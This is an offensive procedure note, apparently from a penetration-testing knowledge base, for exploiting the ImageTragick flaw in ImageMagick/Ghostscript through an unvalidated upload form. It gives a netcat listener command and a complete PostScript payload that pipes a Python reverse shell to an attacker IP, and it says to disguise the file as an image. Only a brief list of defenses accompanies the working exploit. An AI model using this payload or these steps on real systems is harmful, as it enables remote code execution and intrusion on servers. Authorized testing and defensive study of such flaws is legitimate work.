---
tags:
  - file-upload
  - imagetragick
  - rce
type: procedure
tools:
  - '[[tools/netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/postscript-python-reverse-shell]]'
  - '[[commands/netcat-listen-8080]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:24:15.400Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6317e7ed-f550-4012-8cb3-e6376a44fca6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Upload-Malicious-PostScript-File

## Summary

Upload a malicious PostScript file disguised as an image to exploit the ImageTragick vulnerability in ImageMagick's Ghostscript processing, establishing a reverse shell connection.

## Description

The upload endpoint lacks file type validation, allowing PostScript (.ps) files to be processed by ImageMagick with Ghostscript enabled. The payload uses the /OutputFile operator to pipe output to a Python subprocess for a reverse shell. Prerequisites include a netcat listener on port 8080. This leads to arbitrary code execution on the EC2 instance.

## Requirements

1. Access to upload interface from Step 1
2. Netcat listener running on attacker machine (port 8080)
3. Malicious .ps file prepared with reverse shell payload
4. Attacker IP redacted for connection

## Defense

Defensive measures and detection strategies:

- Validate and sanitize uploaded file types (e.g., MIME checks)
- Disable Ghostscript in ImageMagick (policy.xml config)
- Scan uploads for malicious patterns
- Monitor for unusual file processing logs

## Objectives

1. Deliver the exploit payload via upload
2. Establish reverse shell connection
3. Gain initial code execution

## Instructions

### Step 1: Start Netcat Listener

**Context**: Set up the receiver for the incoming shell.

**Command** ([[commands/netcat-listen-8080]]):
```bash
nc -lvp 8080
```

> Listens on all interfaces port 8080; output shows "Listening on [0.0.0.0] (family 0, port 8080)".

### Step 2: Prepare and Upload Payload

**Context**: Create the PostScript file and submit via the web form.

**Command** ([[commands/postscript-python-reverse-shell]]):
Create file with content:
```bash
%!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if legal mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[redacted-ip]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

> Save as .jpg or .png disguise, upload via form. Expected: Upload succeeds, payload queued for processing.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/postscript-python-reverse-shell]]
- [[commands/netcat-listen-8080]]

## Tools Used

- [[tools/netcat]]

## Tags

- file-upload
- imagetragick
- rce
